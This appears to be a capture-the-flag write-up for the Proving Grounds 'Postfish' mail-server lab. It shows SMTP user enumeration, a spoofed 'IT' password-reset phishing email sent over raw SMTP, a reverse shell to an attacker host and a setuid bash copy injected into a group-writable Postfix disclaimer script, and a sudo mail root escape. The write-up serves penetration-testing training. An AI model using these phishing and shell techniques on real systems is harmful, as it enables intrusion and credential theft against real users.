# Postfish — Proving Grounds

> [!abstract] Summary
> Postfish is a mail server (Postfix SMTP + Dovecot POP3/IMAP). SMTP `VRFY` user-enumeration against a names wordlist (seeded from the website's "Our Team" page) reveals valid mailboxes including `sales` and `brian.moore`. Weak credentials `sales:sales` log in over IMAP/POP3, exposing a mail thread announcing password-reset links — the lure for a **phishing** email to `brian.moore`, which captures his password. As `brian.moore` (a member of the `filter` group), the group-writable Postfix **disclaimer** script (`/etc/postfix/disclaimer`) is edited to add a reverse shell and triggered by sending mail — giving a shell as the `filter` user. `filter` has `sudo` on `/usr/bin/mail`, which (GTFOBins) spawns a root shell.

**Target:** `192.168.142.137`  (set `postfish.off` in `/etc/hosts`)

## Methodology

1. Scan all TCP ports; identify Postfix/Dovecot and the web site.
2. Enumerate SMTP users with `VRFY` and a names wordlist built from the team page.
3. Log in as `sales:sales` over IMAP/POP3; read the password-reset lure.
4. Phish `brian.moore` to capture his password; SSH in.
5. Abuse the group-writable Postfix disclaimer script for a shell as `filter`.
6. `sudo mail` (GTFOBins) → root.

The SMTP banner advertises the hostname `postfish.off` and (importantly) the **`VRFY`** command. Add the host to `/etc/hosts`:

```
echo "192.168.142.137  postfish.off" | sudo tee -a /etc/hosts
```

Browse `http://postfish.off/` — the **"Our Team"** page (`team.html`) lists staff names (e.g. Brian Moore, sales manager). These seed the username wordlist.

## SMTP user enumeration (VRFY)

Use `smtp-user-enum` with the `VRFY` method against a names wordlist:

```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.142.137
```

Valid users surface (e.g. `hr`, `sales`). Build name variations from the team page (first.last etc.) and re-check:

```
# e.g. generate brian.moore-style variants, append the domain, re-run VRFY
smtp-user-enum -M VRFY -U usernames -t 192.168.142.137
# -> brian.moore@postfish.off exists
```

## Credential access + mailbox

Weak credentials get in — **`sales:sales`** works over IMAP (143) / POP3 (110). Log in and read the inbox over IMAP:

```
nc -nv postfish.off 143
A1 LOGIN sales sales
A1 SELECT INBOX
A1 FETCH 1 body[text]
```

The message (from "IT" to the sales team) announces: password-reset links will be sent out so staff can register on the ERP system. That is the pretext for phishing.

## Phishing brian.moore

Start a listener for the click-back on Kali:

```
sudo nc -lvnp 80
```

Send a spoofed "password reset" mail to `brian.moore` via raw SMTP, pointing the link at your Kali IP:

```
nc -v postfish.off 25
helo test
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA

Subject: Password reset process

Hi Brian,

Please follow this link to reset your password: http://<KALI_IP>/

Regards,
IT
.
QUIT
```

Brian "clicks" the link; his credentials land on the listener (e.g. a request carrying the password). SSH in:

```
ssh brian.moore@192.168.142.137
```

## Privilege escalation #1 — Postfix disclaimer script → `filter`

Enumerate as `brian.moore` (`id`, LinPEAS). Brian is in the non-default **`filter`** group, and the Postfix disclaimer filter script is group-writable:

```
-rwxrwx--- 1 root filter 1184 /etc/postfix/disclaimer
```

> [!info] How the disclaimer filter runs
> Postfix was configured (per the alterMIME howtoforge guide) to pipe outgoing mail for listed addresses through `/etc/postfix/disclaimer`, which runs as the `filter` user from `/var/spool/filter` and appends `disclaimer.txt`. Because the script is writable by group `filter` — and Brian is in that group — we can inject commands that run whenever mail is processed.

Add a reverse shell to the **top** of the script (it runs before the altermime block):

```
# prepend to /etc/postfix/disclaimer
cp /bin/bash /tmp
chmod u+s /tmp/bash
bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
```

Start a listener, then trigger the filter by sending any mail through SMTP:

```
nc -v postfish.off 25
helo test
MAIL FROM: it@postfish.off
RCPT TO: brian.moore@postfish.off
DATA

Shell please

.
QUIT
```

The shell returns as the **`filter`** user.

## Privilege escalation #2 — `sudo mail` → root

As `filter`, check `sudo -l`:

```
User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *
```

`mail` is on GTFOBins — its `--exec` escape spawns a shell as root:

```
sudo mail --exec='!/bin/bash'
```

`id` now shows root; read `/root/proof.txt`.

## Lessons learned

- A mail server's `VRFY` (and `EXPN`/`RCPT`) commands leak valid users — seed the wordlist from the org's own team/about page for realistic names.
- Try weak/obvious creds (`sales:sales`) across **every** auth surface (SMTP/IMAP/POP3). A mailbox often contains the next pivot — here a phishing pretext.
- Phishing is a legitimate foothold technique on mail boxes: spoof internal "IT" mail with a link to your listener to capture a target's password.
- Non-default group membership (`filter`) + a group-writable script that a privileged process executes is a clean privesc. Then `sudo -l` → GTFOBins (`mail --exec`) for root.
